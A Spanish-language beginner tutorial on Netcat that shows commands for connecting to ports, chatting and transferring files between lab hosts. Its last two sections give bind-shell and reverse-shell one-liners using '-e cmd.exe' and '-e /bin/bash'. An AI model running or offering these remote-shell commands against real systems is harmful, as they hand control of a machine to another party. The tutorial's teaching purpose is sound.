# Uso básico de Netcat
Netcat es una herramienta de análisis de red que permite abrir puertos, transferir archivos, chatear, obtener una shell de un host remoto y muchas cosas mas.

**Después de esta rápida intro. Empecemos con el código!**

![programmer_gif](https://media.giphy.com/media/13HgwGsXF0aiGY/giphy.gif)

---
**🔹 Para conectarnos a un puerto de un host.**

- Ejemplo: Vamos a conectarnos al puerto 21 (FTP) de un host con IP: 192.168.0.100

 ```bash
nc -nv 192.168.0.100 21
```

---
**🔹 Para chatear desde dos hosts distintos a través de un puerto.**

- Ejemplo: Para este ejemplo vamos a utilizar el puerto 4444 y dos hosts:

  - host1: 192.168.0.100
  
  - host2: 192.168.0.101

En **host1** ejecutamos:

 ```bash
nc -nvlp 4444
```

En **host2** ejecutamos:

 ```bash
nc -nv 192.168.0.100 4444
```

Desde este momento ambos equipos estarán conectados al puerto 4444 y todo lo que se escriba en uno será transmitido al otro.
La comunicación es bidireccional.

Para cortar la conexión. Basta con pulsar CTRL + C

---
**🔹 Para transferir archivos entre dos hosts a traves de un puerto.**

- Ejemplo: Para este ejemplo vamos a utilizar el puerto 4444 y dos hosts:

  - host1: 192.168.0.100
  
  - host2: 192.168.0.101

Desde **host1** vamos a recibir un fichero. A través del puerto 4444. Para ello ejecutamos:

 ```bash
nc -nvlp 4444 > archivo_recibido.txt
```

En **host2** vamos a enviar el fichero por medio del mismo puerto. Para ello ejecutamos:

 ```bash
nc -nv 192.168.0.100 4444 < archivo_enviado.txt
```
---
**🔹 Bind Shell: conectarnos a la shell de un servidor por medio de un puerto**

- Ejemplo: Para este ejemplo vamos a utilizar el puerto 4444 y dos hosts:

  - host1: 192.168.0.100  ->  En este caso usaremos un Windows.
  
  - host2: 192.168.0.101  ->  En este caso será un Linux.

Desde **host1** vamos a servir la shell. A través del puerto 4444. Para ello ejecutamos:

 ```bash
nc -nvlp 4444 -e cmd.exe
```

En **host2** vamos a conectarnos al puerto indicado para tomar el control de la shell. Para ello ejecutamos:

 ```bash
nc -nv 192.168.0.100 4444
```

En cuanto se ejecute lo anterior. Tendremos el control de la shell de **host1** (Windows). Desde **host2** (Linux).

---
**🔹 Reverse Shell: servir la shell de un servidor por medio de un puerto.**

- Ejemplo: Para este ejemplo vamos a utilizar el puerto 4444 y dos hosts Linux:

  - host1: 192.168.0.100
  
  - host2: 192.168.0.101

Desde **host1** vamos a levantar el puerto 4444 para que este escuchando. Para ello ejecutamos:

 ```bash
nc -nvlp 4444
```

En **host2** vamos a servir una shell a través del puerto indicado. Para ello ejecutamos:

 ```bash
nc -nv 192.168.0.100 4444 -e /bin/bash
```

En cuanto se ejecute lo anterior. Desde **host1** podremos tener el control de la shell ofrecida por **host2**. 